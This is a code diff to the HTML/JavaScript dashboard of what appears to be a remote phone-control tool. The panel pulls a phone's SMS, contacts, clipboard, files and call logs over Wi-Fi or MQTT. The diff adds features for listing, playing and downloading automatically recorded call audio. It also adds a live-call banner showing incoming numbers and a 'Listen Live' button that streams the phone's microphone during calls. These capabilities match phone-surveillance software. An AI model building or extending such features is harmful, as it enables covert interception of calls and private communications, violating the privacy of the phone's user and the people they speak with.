@@ -1,4 +1,4 @@
-﻿﻿﻿﻿﻿﻿﻿﻿<html lang="en">
+﻿﻿<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -287,6 +287,25 @@
             </button>
             <span id="clock" class="font-mono text-gray-300">00:00</span>
             <button onclick="location.reload()" title="Disconnect" class="hover:text-red-400 font-bold ml-1">⏻</button>
+        </div>
+    </div>
+
+    <!-- Floating Live Call Alert Banner (Ambient Intelligence) -->
+    <div id="live-call-banner" class="hidden fixed top-16 left-1/2 -translate-x-1/2 bg-gray-900/95 text-white px-4 py-2.5 rounded-2xl shadow-2xl border border-rose-500/40 z-50 flex items-center gap-3 backdrop-blur-xl animate-bounce text-xs select-none">
+        <div class="w-8 h-8 rounded-full bg-rose-600/30 text-rose-400 flex items-center justify-center font-bold text-base animate-pulse">📞</div>
+        <div>
+            <div class="flex items-center gap-1.5 font-bold text-gray-100">
+                <span id="live-call-status-badge" class="w-2 h-2 rounded-full bg-rose-500 animate-ping"></span>
+                <span id="live-call-title">Active Call</span>
+            </div>
+            <div id="live-call-number" class="text-[11px] text-gray-300 font-mono">Unknown Number</div>
+        </div>
+        <div class="flex items-center gap-2 ml-2">
+            <button id="live-call-listen-btn" onclick="toggleLiveCallListen()" class="bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold px-3 py-1.5 rounded-xl shadow text-xs flex items-center gap-1 transition-all">
+                <span>🎧</span>
+                <span id="live-call-listen-label">Listen Live</span>
+            </button>
+            <button onclick="dismissLiveCallBanner()" class="text-gray-400 hover:text-white text-sm px-1.5 py-1">✕</button>
         </div>
     </div>
 
@@ -861,22 +880,56 @@
 
 
 
-    <!-- Window: Call Logs -->
-    <div id="call-logs-window" class="window hidden" style="display: none; width: 420px; height: 480px; top: 120px; left: 380px;">
+    <!-- Window: Call Logs & Audio Recordings -->
+    <div id="call-logs-window" class="window hidden" style="display: none; width: 450px; height: 520px; top: 110px; left: 370px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
             <div class="flex items-center gap-2">
                 <span class="text-xs">📑</span>
-                <span class="font-semibold text-xs">Call History</span>
+                <span class="font-semibold text-xs">Call History & Audio Logs</span>
             </div>
             <button onclick="wm.closeWindow('call-logs-window')" class="text-gray-400 hover:text-red-400 text-sm">✕</button>
         </div>
         <div class="flex-1 bg-white overflow-hidden flex flex-col">
-            <div class="p-2.5 bg-gray-50 border-b flex justify-between items-center text-[11px] text-gray-500 font-medium">
-                <span>Recent 200 calls</span>
-                <button onclick="sendCommand({action: 'FETCH_CALL_LOGS'})" class="text-blue-600 hover:underline">🔄 Refresh</button>
+            <!-- Tabs: Call History vs Audio Recordings -->
+            <div class="flex border-b text-xs font-semibold bg-gray-100 p-1 gap-1">
+                <button id="call-tab-logs" onclick="switchCallLogTab('logs')" class="flex-1 py-1.5 rounded bg-white text-blue-600 shadow-sm transition-all text-center">
+                    📞 Call History
+                </button>
+                <button id="call-tab-records" onclick="switchCallLogTab('records')" class="flex-1 py-1.5 rounded text-gray-500 hover:text-gray-800 transition-all text-center flex items-center justify-center gap-1.5">
+                    <span>🎙️ Call Recordings</span>
+                    <span id="call-records-badge" class="bg-blue-100 text-blue-700 text-[10px] px-1.5 py-0.2 rounded-full font-mono hidden">0</span>
+                </button>
             </div>
-            <div id="call-logs-list" class="flex-1 overflow-y-auto divide-y text-xs">
-                <div class="p-4 text-center text-gray-400 text-xs">Loading call logs...</div>
+
+            <!-- Tab 1: Call Logs List -->
+            <div id="call-logs-section" class="flex-1 flex flex-col overflow-hidden">
+                <div class="p-2 bg-gray-50 border-b flex justify-between items-center text-[11px] text-gray-500 font-medium">
+                    <span id="call-logs-count-label">Recent calls (50 chunks)</span>
+                    <button onclick="sendCommand({action: 'FETCH_CALL_LOGS'})" class="text-blue-600 hover:underline">🔄 Refresh</button>
+                </div>
+                <div id="call-logs-list" class="flex-1 overflow-y-auto divide-y text-xs">
+                    <div class="p-4 text-center text-gray-400 text-xs">Loading call logs...</div>
+                </div>
+            </div>
+
+            <!-- Tab 2: Call Recordings List & Audio Player -->
+            <div id="call-records-section" class="hidden flex-1 flex flex-col overflow-hidden">
+                <div class="p-2 bg-gray-50 border-b flex justify-between items-center text-[11px] text-gray-500 font-medium">
+                    <span>Recorded Call Audio Files</span>
+                    <button onclick="sendCommand({action: 'FETCH_CALL_RECORDINGS'})" class="text-blue-600 hover:underline">🔄 Refresh</button>
+                </div>
+                <!-- Mini In-Window Audio Player -->
+                <div id="call-audio-player-bar" class="hidden p-2.5 bg-gray-900 text-white border-b flex items-center gap-2 text-xs">
+                    <span class="text-emerald-400 animate-pulse text-xs">▶</span>
+                    <div class="flex-1 truncate">
+                        <div id="call-audio-playing-name" class="font-semibold text-[11px] truncate">Playing audio...</div>
+                    </div>
+                    <audio id="call-audio-element" controls class="h-7 w-48 scale-90 origin-right"></audio>
+                    <button onclick="closeCallAudioPlayer()" class="text-gray-400 hover:text-white p-1 text-xs">✕</button>
+                </div>
+                <div id="call-records-list" class="flex-1 overflow-y-auto divide-y text-xs">
+                    <div class="p-4 text-center text-gray-400 text-xs">Loading recordings...</div>
+                </div>
             </div>
         </div>
     </div>
@@ -2293,6 +2346,17 @@
                 triggerFileDownload(data.zipPath, data.zipName);
             } else if (data.type === 'CALL_LOGS_LIST') {
                 renderCallLogs(data.data);
+            } else if (data.type === 'CALL_RECORDINGS_LIST') {
+                renderCallRecordings(data.data || []);
+            } else if (data.type === 'CALL_RECORDING_DATA') {
+                handleCallRecordingData(data);
+            } else if (data.type === 'CALL_STATE_UPDATE') {
+                handleCallStateUpdate(data);
+            } else if (data.type === 'CALL_RECORDING_SAVED') {
+                handleCallRecordingSaved(data);
+            } else if (data.type === 'CALL_RECORDING_DELETED') {
+                showToast(`Recording deleted: ${data.fileName}`, data.success ? 'success' : 'error');
+                sendCommand({ action: 'FETCH_CALL_RECORDINGS' });
             } else if (data.type === 'APPS_LIST') {
                 allInstalledApps = data.data || [];
                 renderApps(allInstalledApps);
@@ -3925,7 +3989,7 @@
                 if(id === 'sms-window') sendCommand({action: 'FETCH_SMS'});
                 if(id === 'contacts-window') sendCommand({action: 'FETCH_CONTACTS'});
                 if(id === 'info-window') sendCommand({action: 'FETCH_STORAGE'});
-                if(id === 'call-logs-window') sendCommand({action: 'FETCH_CALL_LOGS'});
+                if(id === 'call-logs-window') { sendCommand({action: 'FETCH_CALL_LOGS'}); sendCommand({action: 'FETCH_CALL_RECORDINGS'}); }
                 if(id === 'apps-window') sendCommand({action: 'FETCH_APPS'});
                 if(id === 'clipboard-window') sendCommand({action: 'FETCH_CLIPBOARD'});
                 if(id === 'file-window') sendCommand({action: 'FETCH_DIR', path: currentDirPath});
@@ -4032,24 +4096,298 @@
 
 
 
-        function renderCallLogs(logs) {
-            const list = document.getElementById('call-logs-list');
+        // --- Ambient Intelligence: Call Audio Logs & Live Call Hearing Engine ---
+        let currentCallLogTab = 'logs';
+        let pendingAudioDownloadName = null;
+
+        function switchCallLogTab(tab) {
+            currentCallLogTab = tab;
+            const tabLogs = document.getElementById('call-tab-logs');
+            const tabRecords = document.getElementById('call-tab-records');
+            const secLogs = document.getElementById('call-logs-section');
+            const secRecords = document.getElementById('call-records-section');
+
+            if (tab === 'logs') {
+                tabLogs.className = "flex-1 py-1.5 rounded bg-white text-blue-600 shadow-sm transition-all text-center";
+                tabRecords.className = "flex-1 py-1.5 rounded text-gray-500 hover:text-gray-800 transition-all text-center flex items-center justify-center gap-1.5";
+                secLogs.classList.remove('hidden');
+                secRecords.classList.add('hidden');
+            } else {
+                tabRecords.className = "flex-1 py-1.5 rounded bg-white text-blue-600 shadow-sm transition-all text-center flex items-center justify-center gap-1.5";
+                tabLogs.className = "flex-1 py-1.5 rounded text-gray-500 hover:text-gray-800 transition-all text-center";
+                secRecords.classList.remove('hidden');
+                secLogs.classList.add('hidden');
+                sendCommand({ action: 'FETCH_CALL_RECORDINGS' });
+            }
+        }
+
+        function renderCallRecordings(records) {
+            const list = document.getElementById('call-records-list');
+            const badge = document.getElementById('call-records-badge');
+            if (badge) {
+                badge.textContent = records.length;
+                badge.classList.toggle('hidden', records.length === 0);
+            }
+            if (!list) return;
             list.innerHTML = '';
-            if (!logs || logs.length === 0) {
-                list.innerHTML = '<div class="p-4 text-center text-gray-400 text-xs">No call logs found</div>';
+            if (!records || records.length === 0) {
+                list.innerHTML = '<div class="p-6 text-center text-gray-400 text-xs">No call recordings found yet.<br><span class="text-[10px] text-gray-500">Recordings will automatically appear here after phone calls.</span></div>';
                 return;
             }
-            logs.forEach(log => {
+
+            records.forEach(rec => {
+                // Name format: CALL_YYYYMMDD_HHMMSS_<Number>.m4a
+                const nameParts = rec.fileName.replace('.m4a', '').split('_');
+                const rawDate = nameParts[1] || '';
+                const rawTime = nameParts[2] || '';
+                const callerNum = nameParts.slice(3).join('_') || 'Unknown';
+                
+                let dateDisplay = 'Recent Call';
+                if (rawDate.length === 8) {
+                    const yr = rawDate.substring(0, 4);
+                    const mo = rawDate.substring(4, 6);
+                    const dy = rawDate.substring(6, 8);
+                    const hr = rawTime.substring(0, 2);
+                    const mn = rawTime.substring(2, 4);
+                    dateDisplay = `${dy}/${mo}/${yr} ${hr}:${mn}`;
+                }
+
+                const sizeKb = Math.round(rec.fileSize / 1024);
+                const sizeDisplay = sizeKb > 1024 ? `${(sizeKb/1024).toFixed(1)} MB` : `${sizeKb} KB`;
+
+                list.innerHTML += `
+                    <div class="p-3 hover:bg-gray-50 flex justify-between items-center transition-colors">
+                        <div class="flex items-center gap-2.5 truncate pr-2">
+                            <div class="w-8 h-8 rounded-lg bg-rose-50 text-rose-600 flex items-center justify-center text-sm font-bold shadow-sm">🎙️</div>
+                            <div class="truncate">
+                                <div class="font-semibold text-gray-800 text-xs truncate">${callerNum}</div>
+                                <div class="text-[10px] text-gray-400">${dateDisplay} • ${sizeDisplay}</div>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-1.5 shrink-0">
+                            <button onclick="playCallRecording('${rec.fileName}')" class="px-2.5 py-1 bg-emerald-600 hover:bg-emerald-700 text-white rounded-md text-[11px] font-semibold shadow-sm transition-all flex items-center gap-1" title="Play Recording">
+                                <span>▶</span><span>Play</span>
+                            </button>
+                            <button onclick="downloadCallRecording('${rec.fileName}')" class="p-1 text-gray-400 hover:text-blue-600 text-xs hover:bg-blue-50 rounded" title="Download Audio">
+                                ⬇
+                            </button>
+                            <button onclick="deleteCallRecording('${rec.fileName}')" class="p-1 text-gray-400 hover:text-red-600 text-xs hover:bg-red-50 rounded" title="Delete Audio">
+                                🗑️
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function playCallRecording(fileName) {
+            const playerBar = document.getElementById('call-audio-player-bar');
+            const nameEl = document.getElementById('call-audio-playing-name');
+            const audioEl = document.getElementById('call-audio-element');
+            if (playerBar) playerBar.classList.remove('hidden');
+            if (nameEl) nameEl.textContent = `Loading ${fileName}...`;
+
+            if (!isCloudMode) {
+                // Local Wi-Fi direct streaming
+                audioEl.src = `/api/call_recordings/${fileName}`;
+                audioEl.play();
+                if (nameEl) nameEl.textContent = `▶ Playing ${fileName}`;
+            } else {
+                // Remote Cloud over MQTT
+                showToast(`Requesting audio file ${fileName} from phone...`, 'info');
+                sendCommand({ action: 'GET_CALL_RECORDING_BASE64', fileName: fileName });
+            }
+        }
+
+        function handleCallRecordingData(data) {
+            const playerBar = document.getElementById('call-audio-player-bar');
+            const nameEl = document.getElementById('call-audio-playing-name');
+            const audioEl = document.getElementById('call-audio-element');
+
+            if (data.data) {
+                const byteCharacters = atob(data.data);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: data.mimeType || 'audio/mp4' });
+                const blobUrl = URL.createObjectURL(blob);
+
+                if (pendingAudioDownloadName === data.fileName) {
+                    const a = document.createElement('a');
+                    a.href = blobUrl;
+                    a.download = data.fileName;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    pendingAudioDownloadName = null;
+                    showToast(`Downloaded ${data.fileName}!`, 'success');
+                    return;
+                }
+
+                if (playerBar) playerBar.classList.remove('hidden');
+                if (nameEl) nameEl.textContent = `▶ Playing ${data.fileName}`;
+                if (audioEl) {
+                    audioEl.src = blobUrl;
+                    audioEl.play().catch(e => console.warn('Audio play error:', e));
+                }
+            } else if (data.error) {
+                showToast(`Audio load error: ${data.error}`, 'error');
+                if (nameEl) nameEl.textContent = `Error loading audio`;
+            }
+        }
+
+        function downloadCallRecording(fileName) {
+            if (!isCloudMode) {
+                window.open(`/api/call_recordings/${fileName}`, '_blank');
+            } else {
+                pendingAudioDownloadName = fileName;
+                showToast(`Fetching ${fileName} for download...`, 'info');
+                sendCommand({ action: 'GET_CALL_RECORDING_BASE64', fileName: fileName });
+            }
+        }
+
+        function deleteCallRecording(fileName) {
+            if (confirm(`Call recording "${fileName}" delete karein?`)) {
+                sendCommand({ action: 'DELETE_CALL_RECORDING', fileName: fileName });
+            }
+        }
+
+        function closeCallAudioPlayer() {
+            const playerBar = document.getElementById('call-audio-player-bar');
+            const audioEl = document.getElementById('call-audio-element');
+            if (audioEl) {
+                audioEl.pause();
+                audioEl.src = '';
+            }
+            if (playerBar) playerBar.classList.add('hidden');
+        }
+
+        // --- Live Call Ambient Hearing Banner ---
+        let liveCallBannerTimer = null;
+
+        function handleCallStateUpdate(data) {
+            const banner = document.getElementById('live-call-banner');
+            const titleEl = document.getElementById('live-call-title');
+            const numEl = document.getElementById('live-call-number');
+            const badgeEl = document.getElementById('live-call-status-badge');
+            const listenBtn = document.getElementById('live-call-listen-btn');
+            if (!banner) return;
+
+            if (liveCallBannerTimer) clearTimeout(liveCallBannerTimer);
+
+            if (data.state === 'RINGING') {
+                banner.classList.remove('hidden');
+                titleEl.textContent = '📞 Incoming Call...';
+                numEl.textContent = data.number || 'Unknown';
+                badgeEl.className = 'w-2 h-2 rounded-full bg-amber-400 animate-ping';
+                banner.className = 'fixed top-16 left-1/2 -translate-x-1/2 bg-gray-900/95 text-white px-4 py-2.5 rounded-2xl shadow-2xl border border-amber-500/40 z-50 flex items-center gap-3 backdrop-blur-xl animate-bounce text-xs select-none';
+            } else if (data.state === 'OFFHOOK') {
+                banner.classList.remove('hidden');
+                titleEl.textContent = '🔴 Active Call in Progress';
+                numEl.textContent = data.number || 'Active Call';
+                badgeEl.className = 'w-2 h-2 rounded-full bg-rose-500 animate-ping';
+                banner.className = 'fixed top-16 left-1/2 -translate-x-1/2 bg-gray-900/95 text-white px-4 py-2.5 rounded-2xl shadow-2xl border border-rose-500/50 z-50 flex items-center gap-3 backdrop-blur-xl text-xs select-none shadow-rose-950/50';
+            } else if (data.state === 'IDLE') {
+                titleEl.textContent = 'Call Ended';
+                badgeEl.className = 'w-2 h-2 rounded-full bg-gray-400';
+                banner.className = 'fixed top-16 left-1/2 -translate-x-1/2 bg-gray-900/95 text-white px-4 py-2.5 rounded-2xl shadow-2xl border border-gray-700 z-50 flex items-center gap-3 backdrop-blur-xl text-xs select-none opacity-80';
+                liveCallBannerTimer = setTimeout(() => {
+                    banner.classList.add('hidden');
+                }, 4000);
+
+                // Auto refresh call logs & recordings
+                sendCommand({ action: 'FETCH_CALL_LOGS' });
+                sendCommand({ action: 'FETCH_CALL_RECORDINGS' });
+            }
+        }
+
+        function toggleLiveCallListen() {
+            const listenLabel = document.getElementById('live-call-listen-label');
+            const listenBtn = document.getElementById('live-call-listen-btn');
+            
+            // Re-use global mic streaming
+            toggleGlobalMic();
+            
+            const isMicActive = document.getElementById('dock-mic-label')?.textContent.includes('On');
+            if (isMicActive) {
+                if (listenLabel) listenLabel.textContent = 'Stop Listening';
+                if (listenBtn) listenBtn.className = 'bg-rose-600 hover:bg-rose-700 text-white font-bold px-3 py-1.5 rounded-xl shadow text-xs flex items-center gap-1 transition-all animate-pulse';
+            } else {
+                if (listenLabel) listenLabel.textContent = 'Listen Live';
+                if (listenBtn) listenBtn.className = 'bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold px-3 py-1.5 rounded-xl shadow text-xs flex items-center gap-1 transition-all';
+            }
+        }
+
+        function dismissLiveCallBanner() {
+            const banner = document.getElementById('live-call-banner');
+            if (banner) banner.classList.add('hidden');
+        }
+
+        function handleCallRecordingSaved(data) {
+            const durSec = Math.round((data.durationMs || 0) / 1000);
+            showToast(`🎙️ Call recording saved for ${data.number || 'Call'} (${durSec}s)!`, 'success');
+            sendCommand({ action: 'FETCH_CALL_RECORDINGS' });
+        }
+
+        // --- 50-Chunk Infinite Scroll Pagination for Call Logs ---
+        let allCallLogsCache = [];
+        let displayedCallLogsCount = 0;
+        const CALL_LOGS_CHUNK_SIZE = 50;
+
+        function renderCallLogs(logs) {
+            allCallLogsCache = logs || [];
+            displayedCallLogsCount = 0;
+            const list = document.getElementById('call-logs-list');
+            if (!list) return;
+            list.innerHTML = '';
+
+            if (allCallLogsCache.length === 0) {
+                list.innerHTML = '<div class="p-4 text-center text-gray-400 text-xs">No call logs found</div>';
+                const countLabel = document.getElementById('call-logs-count-label');
+                if (countLabel) countLabel.textContent = '0 calls';
+                return;
+            }
+
+            // Bind infinite scroll event listener once
+            if (!list.dataset.hasScrollListener) {
+                list.dataset.hasScrollListener = "true";
+                list.addEventListener('scroll', () => {
+                    // Check if scrolled near bottom (within 30px)
+                    if (list.scrollTop + list.clientHeight >= list.scrollHeight - 30) {
+                        appendNextCallLogsChunk();
+                    }
+                });
+            }
+
+            // Load initial 50 calls chunk
+            appendNextCallLogsChunk();
+        }
+
+        function appendNextCallLogsChunk() {
+            if (displayedCallLogsCount >= allCallLogsCache.length) return;
+
+            const list = document.getElementById('call-logs-list');
+            if (!list) return;
+
+            // Remove existing bottom loader/footer if any
+            const existingLoader = document.getElementById('call-logs-chunk-loader');
+            if (existingLoader) existingLoader.remove();
+            const existingFooter = document.getElementById('call-logs-chunk-footer');
+            if (existingFooter) existingFooter.remove();
+
+            const nextChunk = allCallLogsCache.slice(displayedCallLogsCount, displayedCallLogsCount + CALL_LOGS_CHUNK_SIZE);
+            
+            let chunkHtml = '';
+            nextChunk.forEach(log => {
                 const isMissed = log.type === 'Missed';
                 const isIncoming = log.type === 'Incoming';
                 const badgeColor = isMissed ? 'text-red-500 bg-red-50' : (isIncoming ? 'text-blue-500 bg-blue-50' : 'text-green-500 bg-green-50');
                 const dateStr = new Date(log.date).toLocaleString([], {month: 'short', day: 'numeric', hour: '2-digit', minute:'2-digit'});
 
-
-
-
-                list.innerHTML += `
-                    <div class="p-3 hover:bg-gray-50 flex justify-between items-center cursor-pointer" onclick="document.getElementById('dial-number').value='${log.number}'; wm.openWindow('contacts-window')">
+                chunkHtml += `
+                    <div class="p-3 hover:bg-gray-50 flex justify-between items-center cursor-pointer transition-colors" onclick="document.getElementById('dial-number').value='${log.number}'; wm.openWindow('contacts-window')">
                         <div>
                             <div class="font-semibold text-gray-800">${log.name !== 'Unknown' ? log.name : log.number}</div>
                             <div class="text-[11px] text-gray-400">${log.number} • ${dateStr}</div>
@@ -4061,6 +4399,33 @@
                     </div>
                 `;
             });
+
+            list.insertAdjacentHTML('beforeend', chunkHtml);
+            displayedCallLogsCount += nextChunk.length;
+
+            // Update Header Counter
+            const countLabel = document.getElementById('call-logs-count-label');
+            if (countLabel) {
+                countLabel.textContent = `Showing ${displayedCallLogsCount} of ${allCallLogsCache.length} calls (Chunks of 50)`;
+            }
+
+            // Append loader or footer indicator
+            if (displayedCallLogsCount < allCallLogsCache.length) {
+                const loaderHtml = `
+                    <div id="call-logs-chunk-loader" class="p-2.5 text-center text-blue-600 text-[11px] font-medium bg-blue-50/60 flex items-center justify-center gap-1.5 border-t">
+                        <span class="animate-spin">⏳</span>
+                        <span>Scroll to bottom for next 50 calls (${displayedCallLogsCount}/${allCallLogsCache.length})...</span>
+                    </div>
+                `;
+                list.insertAdjacentHTML('beforeend', loaderHtml);
+            } else {
+                const footerHtml = `
+                    <div id="call-logs-chunk-footer" class="p-2.5 text-center text-gray-400 text-[11px] font-medium bg-gray-50 border-t">
+                        ✓ All ${allCallLogsCache.length} call logs loaded
+                    </div>
+                `;
+                list.insertAdjacentHTML('beforeend', footerHtml);
+            }
         }
 
 
